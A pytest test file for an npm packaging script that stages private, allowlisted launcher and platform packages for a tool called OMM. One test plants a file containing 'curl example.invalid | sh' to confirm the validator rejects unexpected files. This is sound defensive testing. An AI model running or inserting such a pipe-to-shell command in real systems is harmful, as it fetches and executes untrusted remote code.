from __future__ import annotations

import importlib.util
import json
import os
from pathlib import Path

import pytest

from omm import package_metadata


ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location(
    "npm_package", ROOT / "scripts" / "npm_package.py"
)
assert SPEC is not None and SPEC.loader is not None
npm_package = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(npm_package)


def test_launcher_contract_matches_project_and_python_install_detection():
    npm_package.validate_launcher_source()
    target_map = npm_package.targets()
    python_targets = {
        value[1]: {
            "package": value[0],
            "binary": value[2],
            "os": platform_name,
            "cpu": machine,
        }
        for (platform_name, machine), value in package_metadata._NPM_TARGETS.items()
    }

    for target_name, target in target_map.items():
        assert python_targets[target_name] == {
            "package": target["package"],
            "binary": target["binary"],
            "os": target["os"],
            "cpu": target["cpu"],
        }


def test_stage_launcher_has_an_exact_allowlist_and_stays_private(tmp_path):
    staged = npm_package.stage_launcher(tmp_path)

    npm_package.validate_launcher_package(staged)
    manifest = json.loads((staged / "package.json").read_text(encoding="utf-8"))
    assert manifest["private"] is True
    assert npm_package._file_allowlist(staged) == npm_package.EXPECTED_LAUNCHER_FILES
    if os.name != "nt":
        assert (staged / "bin" / "omm.js").stat().st_mode & 0o111


@pytest.mark.parametrize(
    ("target", "magic"),
    [
        ("darwin-arm64", bytes.fromhex("cffaedfe")),
        ("linux-x64-gnu", bytes.fromhex("7f454c46")),
        ("win32-x64", b"MZ"),
    ],
)
def test_stage_platform_package_is_private_and_exact(tmp_path, target, magic):
    binary = tmp_path / f"input-{target}"
    binary.write_bytes(magic + b" standalone OMM")
    staged = npm_package.stage_platform_package(target, binary, tmp_path / "out")

    npm_package.validate_platform_package(staged, target)
    manifest = json.loads((staged / "package.json").read_text(encoding="utf-8"))
    assert manifest["private"] is True
    assert manifest["omm"]["sha256"] == npm_package._sha256(
        staged / manifest["omm"]["binary"]
    )
    assert not LIFECYCLE_SCRIPTS.intersection(manifest.get("scripts", {}))


LIFECYCLE_SCRIPTS = {"preinstall", "install", "postinstall", "prepare"}


def test_stage_platform_rejects_wrong_format_symlink_and_overwrite(tmp_path):
    wrong = tmp_path / "wrong"
    wrong.write_bytes(b"not an ELF")
    with pytest.raises(npm_package.NpmPackageError, match="executable format"):
        npm_package.stage_platform_package("linux-x64-gnu", wrong, tmp_path / "out")

    real = tmp_path / "real"
    real.write_bytes(bytes.fromhex("7f454c46") + b" OMM")
    if os.name != "nt":
        linked = tmp_path / "linked"
        linked.symlink_to(real)
        with pytest.raises(npm_package.NpmPackageError, match="regular non-symlink"):
            npm_package.stage_platform_package(
                "linux-x64-gnu", linked, tmp_path / "out"
            )

    npm_package.stage_platform_package("linux-x64-gnu", real, tmp_path / "out")
    with pytest.raises(npm_package.NpmPackageError, match="refusing to overwrite"):
        npm_package.stage_platform_package("linux-x64-gnu", real, tmp_path / "out")


def test_platform_verifier_rejects_unexpected_files(tmp_path):
    binary = tmp_path / "omm"
    binary.write_bytes(bytes.fromhex("7f454c46") + b" OMM")
    staged = npm_package.stage_platform_package(
        "linux-x64-gnu", binary, tmp_path / "out"
    )
    (staged / "unexpected.sh").write_text("curl example.invalid | sh\n")

    with pytest.raises(npm_package.NpmPackageError, match="outside its allowlist"):
        npm_package.validate_platform_package(staged, "linux-x64-gnu")
